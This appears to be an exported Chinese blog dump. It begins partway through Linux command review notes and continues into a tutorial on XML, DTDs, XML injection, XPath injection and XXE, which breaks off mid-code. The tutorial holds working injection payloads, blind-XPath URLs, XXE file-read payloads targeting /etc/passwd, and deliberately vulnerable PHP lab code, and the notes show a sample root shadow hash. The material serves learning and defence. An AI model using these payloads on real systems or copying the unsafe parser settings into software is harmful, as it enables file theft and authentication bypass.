查找文件-gid 数字 按照属组组 ID 查找文件-user 用户名 按照属主用户名查找文件-group 组名 按照属组组名查找文件-nouser 找没有属主的文件 find / -nouser 按照文件权限-name 按照文件名-size 按照文件大小。+50k:大于 50k，-50k:小于 50k，50k:等于50k如：find / -size +50k-type 类型 按照文件类型 。f：普通 d：目录 l：链接-perm 755 按照权限查找如：find . -perm 644-inum 按照 i 节点 ls -i如：find . -inum 节点数-iname 按照文件名查找，不区分大小写 2.grep &quot;字符串&quot; 文件名 查找符合条件的字串行grep -i &quot;root&quot; /etc/passwd-v 反向选择-i 忽略大小写 | 管道符命令 1 | 命令 2 命令 1 的结果，作为命令 2 的执行条件 7、压缩和解压缩（1）.zip格式压缩：zip 压缩之后产生的包名 源文件如：zip -r test.zip /test -r 压缩目录解压缩：unzip 压缩包（2）.gz格式不会打包压缩：gzip -c 源文件 &gt; 压缩文件如：gzip -c cangls &gt; cangls.gzgzip -r 源目录 不能压缩目录，压缩目录下所有内容解压缩：gzip -d 压缩包（3）.bz2格式不能压缩目录压缩：bzip2 源文件 如：bzip2 aabzip2 -k 源文件 压缩之后保留源文件解压缩：bzip2 -d 压缩文件 如：bzip2 -d aa.bz2 另一种：bunzip2 压缩文件 解压缩：-k 保留压缩文件（4）.tar格式打包命令，不压缩打包：tar -cvf 打包文件名 源文件 如：tar -cvf aa.tar aa-c 打包 -v 显示打包过程 -f 指定生产后的文件名解打包：tar -xvf 打包文件名 如：tar -xvf aa.tar .gz 格式压缩同时打包：tar -zcvf 压缩文件名 源文件如：tar -zcvf aa.tar.gz aa -z 识别.gz 格式解压缩同时解打包：tar -zxvf 压缩文件名 .bz2格式压缩同时打包：tar -jcvf 压缩文件名 源文件压缩同时打包如：tar -jcvf aa.tar.bz2 aa解打包同时解压缩：tar -jxvf aa.tar.bz2 查看不解包tar -ztvf aa.tar.gz 查看不解包tar -jtvf aa.tar.bz2 -t 只查看，不解压 指定解压缩文件位置：tar -jxvf root.tar.bz2 -C /tmp/ 指定解压缩位置 8、常用网络命令w 查询当前登录服务器的所有用户who 查询登录用户last 列出登录系统的相关信息lastlog 显示所有账户最后一次的登录时间write 用户名 给在线用户写信息如：write root tty1 写内容给 tty1 登录的 root，ctrl+d 保存，发送wall 对所有在线用户说话mail 邮件命令 ping -c 次数 ip 探测网络通畅ping -s 65536 ip 指定探测数据包的大小 ifconfig 查询本机网络信息ifconfig eth0 192.168.140.252 netmask 255.255.255.0 临时生效eth0:0 第一块网卡的第一模拟网卡 netstat 查看网络状态telnet ip 端口 测试端口是否可以正常连接netstat -tlun 查看本机所有监听端口-t tcp -u udp -l 监听 -n 以 IP 和端口号显示 9、关机、重启命令关机命令：shutdown -h nowinit 0haltpoweroff 重启命令：shutdown -r nowrebootinit 6 10、挂载命令首先选择光盘镜像，然后连接光盘镜像，最后挂载挂载光盘 mkdir /mnt/cdrommount /dev/cdrom /mnt/cdrom 卸载光盘 umount /dev/cdromumount /mnt/cdrom 二、软件安装rpm包安装1、挂载光盘2、进入/mnt/cdrom/Server/3、执行命令rpm -ivh 包全名-i install安装-v 显示更详细信息-h 打印#显示安装进度4、服务启动 service 服务名 start|stop|restart|status 三、用户管理1、用户相关文件/etc/passwd 用户信息文件root:x:0:0:root:/root:/bin/bash第一列：用户名第二列：密码位第三列：用户 ID /etc/shadow 影子文件root:$6$9w5Td6lg$bgpsy3olsq9WwWvS5Sst2W3ZiJpuCGDY.4w4MRk3ob/i85fI38RH15wzVoomff 9isV1PzdcXmixzhnMVhMxbv0:15775:0:99999:7:::第一列：用户名第二列：加密密码 /etc/group 组信息文件root:x:0:root第一列：组名第二列：组密码位第三列：GID第四列：此组中支持的其他用户.附加组是此组的用户 /etc/gshadow 组密码文件 2、用户管理命令1.添加用户添加用户：useradd 用户名手工指定选项添加用户：创建用户组lamp1：groupadd 组名建立用户qwzf： useradd -u 550 -g lamp1 -G root -d /home/lamp1 -c &quot;test user&quot; -s /bin/bash qwzf 同时查看三个文件： grep &quot;qwzf&quot; /etc/passwd /etc/shadow /etc/group 查看用户家目录：ll -d /home/qwzf2.设置密码passwd 用户名3.用户信息修改usermod -L 用户名 锁定用户usermod -U 用户名 解锁usermod -l 新名 旧名 用户改名4.删除用户userdel -r 用户名5.添加组groupadd 组名6.删除组groupdel 组名(必须是空组)7.把已经存在的用户加入组usermod -G 组名 用户名gpasswd -a 用户名 组名把用户从组中删除：gpasswd -d 用户名 组名3、用户权限赋予例：/test 目录，要求aa、bb、cc有rwx。useradd aa (bb、cc)passwd aa (bb、cc)groupadd testgrpgpasswd -a aa testgrp 把aa、bb、cc、加入组chmod 770 /test 修改组权限chgrp testgrp /test 修改属组 四、权限管理1、ACL权限getfacl 文件名 查询文件的acl权限setfacl 选项(-m设定权限、-b删除权限) 文件名 设定acl权限1.设置acl权限setfacl -m u:用户名:权限 文件名如：setfacl -m u:qwzf:rwx /test给test目录赋予qwzf是rwx的acl权限setfacl -m g:组名:权限 文件名2.删除acl权限setfacl -b 文件名3.acl默认权限默认权限只能赋予目录如：setfacl -m d:u:aa:rwx -R /test2、sudo授权/sbin/ 在此目录下命令只有超级用户才能使用/usr/sbin/1.赋予普通用户权限命令visudo如：让qwzf用户有root所有权限useradd qwzfpasswd qwzfvisudo添加一行如下信息： qwzf ALL=(ALL) ALL 让qwzf用户可以添加其他普通用户： qwzf ALL=/usr/sbin/useradd qwzf ALL=/usr/bin/passwd 执行sudo /usr/sbin/useradd aaqwzf用户添加aa用户3、文件特殊权限SetUID、SetGID、Sticky BIT1.SetUID（1）命令执行者要对该程序有x(执行)权限（2）命令执行者在执行该程序时获得该程序文件属主的身份。（3）SetUID权限只在该程序执行过程中有效。如：qwzf对/usr/bin/vi具有执行权限 chmod u+s /usr/bin/vi 执行完之后，qwzf执行vi，实际以root身份执行 2.SetGID针对文件的作用（1）命令执行者要对该程序有x(执行)权限（2）命令执行者在执行该程序时组身份升级为该程序文件的属组。（3）SetGID权限只在该程序执行过程中有效。 ll /usr/bin/locate qwzf用户执行该命令时，组身份会升级为slocate组 针对目录的作用（1）普通用户对此目录有rx权限，才能进入此目录（2）普通用户在此目录的有效组会变成此目录的属组（3）若普通用户对此目录有w权限，新建文件默认属组是这个目录的属组。如： mkdir /dtest chmod g+s /dtest chmod 777 /dtest/ 让普通用户可以写 3.Sticky BIT4：SUID2：SGID1：SBIT赋予SUID权限chmod 4755 ftest赋予SGID权限chmod 2755 ftest赋予SBIT权限SBIT只对目录有效chmod 1755 dtest/ 五、文件系统管理1、常用磁盘管理命令1.df命令df -ahT-a 显示特殊文件系统-h 单位不再只用KB，换成习惯单位-T 多了文件系统类型一列2.du命令du [选项][目录或文件名]-a 显示每个子文件的磁盘占用量-h 使用习惯单位显示磁盘占用量-s 统计总占用量，而不列出子目录和子文件的占用量3.fsck文件系统修复命令 fsck -y /dev/sdb1 4.显示磁盘状态 dumpe2fs /dev/sda2 5.查看文件的详细时间stat 文件名6.判断文件类型file 文件名 判断文件类型type 命令名 判断命令类型2、fdisk命令手工分区1.fdisk -l 查看系统所有硬盘及分区2.fdisk /dev/sdb 进行磁盘分区n-&gt;p-&gt;1(分区好)-&gt;1-&gt;100-&gt;w 分区大小+100M改变文件系统：n-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w 3.partprobe强制重读所有分区文件，重新挂载分区文件内所有分区4.格式化分区mkfs.ext3 /dev/sdb15.建立挂载点和挂载mkdir /disk1mount /dev/sdb1 /disk16.查看mount 查看所有已经挂载的分区和光盘fdisk -l 查看系统分区df 查看分区占用百分比7、自动挂载修改分区自动挂载文件vi /etc/fstab8、重启测试mount -a 重新挂载所有内容，用它进行测试 六、高级文件系统管理1、磁盘配额1.分区、格式化、挂载、(查看)分区：fdisk /dev/sdbn-&gt;p-&gt;1(分区号)-&gt;1-&gt;100-&gt;w格式化：mkfs.ext3 /dev/sdb1挂载：mkdir /disk1mount /dev/sdb1 /disk1查看：mount | tail -12.磁盘配额的设置（1）开启配额功能，并建立磁盘配额的配置文件（2）设置用户和组的配额限制（3）给用户配额限制：磁盘空间软限制80MB，硬限制100MB（4）以用户wmm1身份登陆系统进行验证。创建120MB的testfile文件2、LVM卷的创建和管理1.创建3个分区，并设置System为Linux LVMfdisk /dev/sdbn-&gt;p-&gt;1(分区号)-&gt;1-&gt;200-&gt;t-&gt;8e-&gt;w2.建立物理卷，建立一个名为scvg卷组3.建立逻辑卷，建立一个wmmlv的逻辑卷。并格式化、挂载、查看3、raid5卷的创建和使用1.使用3块硬盘，建立四个分区2.建立RAID 5，并查看3.格式化与挂载RAID，并查看4.设置开机自动挂载vi /etc/fstab 七、系统管理定时任务 八、日志管理常用日志文件： /var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/ 九、备份管理","categories":[{"name":"复习","slug":"复习","permalink":"https://qwzf.github.io/categories/复习/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.github.io/tags/Linux/"},{"name":"期末复习","slug":"期末复习","permalink":"https://qwzf.github.io/tags/期末复习/"}],"author":"qwzf"},{"title":"从XML相关一步一步到XXE漏洞","slug":"从XML相关一步一步到XXE漏洞","date":"2019-12-02T06:47:00.808Z","updated":"2020-08-01T16:51:02.003Z","comments":true,"path":"2019/12/02/从XML相关一步一步到XXE漏洞/","link":"","permalink":"https://qwzf.github.io/2019/12/02/从XML相关一步一步到XXE漏洞/","excerpt":"","text":"0x00 前言想学XXE漏洞，XXE(XML External Entity Injection)全称为XML外部实体注入。XML？！发现我不会，简单看了一下基础知识，发现XML还可能存在XML注入和XPath注入。于是把XML注入、XPath注入和XML 外部实体注入一起学习了！并写了一下学习笔记。 0x01 XML什么是 XML？XML 指可扩展标记语言（EXtensible Markup Language）。XML 的设计宗旨是传输数据，而不是显示数据。XML 是 W3C 的推荐标准。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML 语言没有预定义的标签。 XML 和 HTML 之间的差异XML 不是 HTML 的替代。XML 和 HTML 为不同的目的而设计： XML 被设计用来传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。HTML 旨在显示信息，而 XML 旨在传输信息。 为什么需要XML现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。 XML基本格式与基本语法基本格式： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--xml文件的声明--&gt; &lt;bookstore&gt; &lt;!--根元素--&gt; &lt;book category=&quot;COOKING&quot;&gt; &lt;!--bookstore的子元素，category为属性--&gt; &lt;title&gt;Everyday Italian&lt;/title&gt; &lt;!--book的子元素，lang为属性--&gt; &lt;author&gt;Giada De Laurentiis&lt;/author&gt; &lt;!--book的子元素--&gt; &lt;year&gt;2005&lt;/year&gt; &lt;!--book的子元素--&gt; &lt;price&gt;30.00&lt;/price&gt; &lt;!--book的子元素--&gt; &lt;/book&gt; &lt;!--book的结束--&gt; &lt;/bookstore&gt; &lt;!--bookstore的结束--&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头。standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。 基本语法： 所有 XML 元素都须有关闭标签。 XML 标签对大小写敏感。 XML 必须正确地嵌套。 XML 文档必须有根元素。 XML 的属性值须加引号。 若多个字符都需要转义，则可以将这些内容存放到CDATA里面 &lt;![CDATA[ 内容 ]]&gt; 0x02 DTDDTD基本概念XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。实体引用XML元素以形如 &lt;tag&gt;foo&lt;/tag&gt; 的标签开始和结束，如果元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 替换 &lt; &gt; &amp; &#39; &quot; 。实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。dtd的引入方式DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。内部 DTD使用内部的dtd文件，即将约束规则定义在xml文档中 &lt;!DOCTYPE 根元素名称 [元素声明]&gt; 示例代码： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE note [&lt;!--定义此文档是 note 类型的文档--&gt; &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!--定义note元素有四个元素--&gt; &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; ]&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;/to&gt; &lt;from&gt;@re&lt;/from&gt; &lt;head&gt;v3ry&lt;/head&gt; &lt;body&gt;g00d!&lt;/body&gt; &lt;/note&gt; 外部 DTD（1）引入外部的dtd文件 &lt;!DOCTYPE 根元素名称 SYSTEM &quot;dtd路径&quot;&gt; （2）使用外部的dtd文件(网络上的dtd文件) &lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文档的URL&quot;&gt; 当使用外部DTD时，通过如下语法引入： &lt;!DOCTYPE root-element SYSTEM &quot;filename&quot;&gt; 示例代码： &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root-element SYSTEM &quot;test.dtd&quot;&gt; &lt;note&gt; &lt;to&gt;Y0u&lt;/to&gt; &lt;from&gt;@re&lt;/from&gt; &lt;head&gt;v3ry&lt;/head&gt; &lt;body&gt;g00d!&lt;/body&gt; &lt;/note&gt; test.dtd &lt;!ELEMENT to (#PCDATA)&gt;&lt;!--定义to元素为”#PCDATA”类型--&gt; &lt;!ELEMENT from (#PCDATA)&gt;&lt;!--定义from元素为”#PCDATA”类型--&gt; &lt;!ELEMENT head (#PCDATA)&gt;&lt;!--定义head元素为”#PCDATA”类型--&gt; &lt;!ELEMENT body (#PCDATA)&gt;&lt;!--定义body元素为”#PCDATA”类型--&gt; PCDATAPCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何&amp;，&lt;，或者&gt;字符，需要用&amp;amp; &amp;lt; &amp;gt;实体来分别替换。CDATACDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。DTD元素DTD属性属性声明语法： &lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt; DTD实例： &lt;!ATTLIST payment Luckey CDATA &quot;Q&quot;&gt; XML实例： &lt;payment Luckey=&quot;Q&quot; /&gt; 以下是 属性类型的选项：默认属性值可使用下列值：DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。 按实体有无参分类，实体分为一般实体和参数实体一般实体的声明：&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;引用一般实体的方法：&amp;实体名称;ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。 参数实体的声明：&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;引用参数实体的方法：%实体名称;ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。 按实体使用方式分类，实体分为内部声明实体和引用外部实体内部实体 &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 内部实体示例代码： &lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY writer &quot;Dawn&quot;&gt; &lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt; ]&gt; &lt;test&gt;&amp;writer;©right;&lt;/test&gt; 外部实体外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。 &lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; 或者 &lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; 外部实体示例代码： &lt;?xml version = &quot;1.0&quot; encoding = &quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt; ]&gt; &lt;author&gt;&amp;file;©right;&lt;/author&gt; 外部实体可支持http、file等协议。不同程序支持的协议不同：PHP支持的协议会更多一些，但需要一定的扩展：PHP引用外部实体，常见的利用协议： file://文件绝对路径 如：file:///etc/passwd http://url/file.txt php://filter/read=convert.base64-encode/resource=xxx.php 参数实体+外部实体 &lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt; 参数实体+外部实体示例代码： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; %file; ]&gt; %file(参数实体)是在DTD中被引用的，而&amp;file;是在xml文档中被引用的。 0x03 XML注入XML的设计宗旨是传输数据，而非显示数据。XML注入是一种古老的技术，通过利用闭合标签改写XML文件实现的。 XML注入简介XML是一种数据组织存储的数据结构方式，安全的XML在用户输入生成新的数据时候应该只能允许用户接受的数据，需要过滤掉一些可以改变XML标签也就是说改变XML结构插入新功能（例如新的账户信息，等于添加了账户）的特殊输入，如果没有过滤，则可以导致XML注入攻击。 XML注入前提条件（1）用户能够控制数据的输入（2）程序有拼凑的数据 注入实例test1.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;manager&gt; &lt;admin id=&quot;1&quot;&gt; &lt;username&gt;admin&lt;/username&gt; &lt;password&gt;admin&lt;/password&gt; &lt;/admin&gt; &lt;admin id=&quot;2&quot;&gt; &lt;username&gt;root&lt;/username&gt; &lt;password&gt;root&lt;/password&gt; &lt;/admin&gt; &lt;/manager&gt; XML与HTML一样，也存在注入攻击，在注入的方法上也非常相似。对于上面的xml文件，如果攻击者能够掌控password字段，那么就会产生XML注入。如攻击者输入： admin &lt;/password&gt;&lt;/admin&gt;&lt;admin id=&quot;3&quot;&gt;&lt;name&gt;hack&lt;/name&gt;&lt;password&gt;hacker&lt;/password&gt;&lt;/admin&gt; 最终修改结果为： &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;manager&gt; &lt;admin id=&quot;1&quot;&gt; &lt;name&gt;admin&lt;/name&gt; &lt;password&gt;admin&lt;/password&gt; &lt;/admin&gt; &lt;admin id=&quot;2&quot;&gt; &lt;username&gt;root&lt;/username&gt; &lt;password&gt;root&lt;/password&gt; &lt;/admin&gt; &lt;admin id=&quot;3&quot;&gt; &lt;name&gt;hack&lt;/name&gt; &lt;password&gt;hacker&lt;/password&gt; &lt;/admin&gt; &lt;/manager&gt; 这样就通过XML注入添加了一个名为hack、密码为：hacker的管理员账户。XML注入两大要素：标签闭合和获取XML表结构 XML注入防御（1）对用户的输入进行过滤（2）对用户的输入进行转义| 预定义字符 | 转以后的预定义字符 ||–|–||&lt;|&amp;lt;||&gt;|&amp;gt;||&amp;|&amp;amp;||&#39;|&amp;apos;||&quot;|&amp;quot;| 0x04 XPath注入XPath注入攻击简介XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。 XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。 XPath注入攻击特点XPath注入攻击利用两种技术，即XPath扫描和 XPath查询布尔化。通过该攻击，攻击者可以控制用来进行XPath查询的XML数据库。这种攻击可以有效地对付使用XPath查询（和XML数据库） 来执行身份验证、查找或者其它操作。 XPath注入攻击同SQL注入攻击类似，但与SQL注入相比，XPath具有的优势： 广泛性只要是利用XPath语法的Web 应用程序若未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。而在SQL注入攻击过程中根据数据库支持的SQL语言不同，注入攻击的实现可能不同。 危害性大XPath语言几乎可以没有访问控制限制的引用XML文档的所有部分。而在SQL注入中，一个“用户”的权限可能被限制到 某一特定的表、列或者查询。XPath注入攻击可以保证得到完整的XML文档，即完整的数据库。只要Web服务应用具有基本的安全漏洞，即可构造针对 XPath应用的自动攻击。 Xpath注入攻击原理与利用XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是cookie，headers，request parameters/input等。Xpath基本语法xPath注入学习之基础语法学习 如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。 Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。1、Xpath直接注入示例代码：test2.xml(存储用户名和密码) &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;root&gt; &lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;username&gt;test1&lt;/username&gt; &lt;password&gt;test1&lt;/password&gt; &lt;/user&gt; &lt;user&gt; &lt;id&gt;2&lt;/id&gt; &lt;username&gt;test2&lt;/username&gt; &lt;password&gt;test2&lt;/password&gt; &lt;/user&gt; &lt;/users&gt; &lt;/root&gt; 2.php(用于接收传入参数，并进行XML查询) &lt;?php $xml=simplexml_load_file(&#39;test2.xml&#39;); $name=$_GET[&#39;name&#39;]; $pwd=$_GET[&#39;pwd&#39;]; $query=&quot;/root/users/user[username/text()=&#39;&quot;.$name.&quot;&#39; and password/text()=&#39;&quot;.$pwd.&quot;&#39;]&quot;; echo $query; $result=$xml-&gt;xpath($query); if($result){ echo &#39;&lt;h2&gt;Welcome&lt;/h2&gt;&#39;; foreach($result as $key=&gt;$value){ echo &#39;&lt;br /&gt;ID:&#39;.$value-&gt;id; echo &#39;&lt;br /&gt;Username:&#39;.$value-&gt;username; } } ?&gt; simplexml_load_file()函数返回类 SimpleXMLElement 的一个对象，该对象的属性包含 XML 文档中的数据 正常查询：/root/users/user[username/text()=&#39;test1&#39;and password/text()=&#39;test1&#39;]攻击者在username字段中输入：&#39; or 1=1 or &#39;&#39;=&#39;变成/root/users/user[username/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;1&#39;]，成功获取所有user数据。上面这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过XPath盲注技术获取最高权限帐号和其它重要文档信息。2、XPath盲注如果遍历出整个XML文档，一般步骤如下：1.盲注根节点利用count（/*）判断根下节点： http://127.0.0.1/xml/2.php?name=&#39; or count(/*) = 1 or &#39;1&#39; = &#39;2 有返回结果证明存在一个根节点。利用substring分割根节点的每个字符，猜解第一级节点： http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/*[position() = 1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;2 http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/*[position() = 1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;2 …最终结果: root2.盲注root的下一级节点判断root的下一级节点数： http://127.0.0.1/xml/2.php?name=&#39; or count(/root/*) = 1 or &#39;1&#39; = &#39;2 有返回结果证明存在一个root的下一级节点。猜解root的下一级节点： http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/root/*[position() = 1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;2 http://127.0.0.1/xml/2.php?name=&#39; or substring(name(/root/*[position() = 1]),2,1)=&#39;s&#39; or &#39;1&#39;=&#39;2 最终结果:users重复上述步骤，直至猜解出所有节点，最后来猜解节点中的数据或属性值。 Xpath注入攻击危害 在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据。 可通过此类漏洞查询获取到系统内部完整的XML文档内容。 逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。 Xpath注入攻击防御 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。 检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串。 对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息。 参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。 通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。 总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量。 0x05 XML外部实体注入(XXE)XXE漏洞简介XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。 XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。 解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。simplexml_load_string()可以读取XML XXE本地搭建环境测试xxe.php &lt;?php $xmlfile=file_get_contents(&#39;php://input&#39;); $dom=new DOMDocument(); $dom-&gt;loadXML($xmlfile); $xml=simplexml_import_dom($dom); $xxe=$xml-&gt;xxe; $str=&quot;$xxe \\n&quot;; echo $str; ?&gt; file_get_contents获取客户端输入内容 new DOMDocument()初始化XML解析器 loadXML($xmlfile)加载客户端输入的XML内容 simplexml_import_dom($dom)获取XML文档节点，如果成功则返回SimpleXMLElement对象，如果失败则返回FALSE。 获取SimpleXMLElement对象中的节点XXE，然后输出XXE内容。 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot;&gt; ]&gt; &lt;xml&gt; &lt;xxe&gt;&amp;file;&lt;/xxe&gt; &lt;/xml&gt; XXE常见利用方式与SQL相似，XXE漏洞也分为有回显和无回显有回显，可以直接在页面中看到payload的执行结果或现象。无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。 1、读取任意文件首先准备一个有XXE漏洞的文件，这里以php文件为例示例代码 &lt;?php $xml = simplexml_load_string($_REQUEST[&#39;xml&#39;]); print_r($xml);//注释掉该语句即为无回显的情况 ?&gt; 构造payload &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY file SYSTEM &quot;file:///d://qwzf.txt&quot; &gt; ]&gt; &lt;root&gt; &lt;name&gt;&amp;file;&lt;/name&gt; &lt;/root&gt; 读取文件，需URL编码后执行。通过构造外部实体payload，在 xml 中 &amp;file ; 变成了外部文件qwzf.txt中内容，导致敏感信息泄露。靶场练习使用一下靶场练习回显读取文件和无回显读取文件：xxe-lab输入，抓包发包，发现通过XML传输数据php源码 &lt;?php $USERNAME = &#39;admin&#39;; //账号 $PASSWORD = &#39;admin&#39;; //密码 $result = null; libxml_disable_entity_loader(false); $xmlfile = file_get_contents(&#39;php://input&#39;); try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; if($username == $USERNAME &amp;&amp; $password == $PASSWORD){ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); }else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); } }catch(Exception $e){ $result = 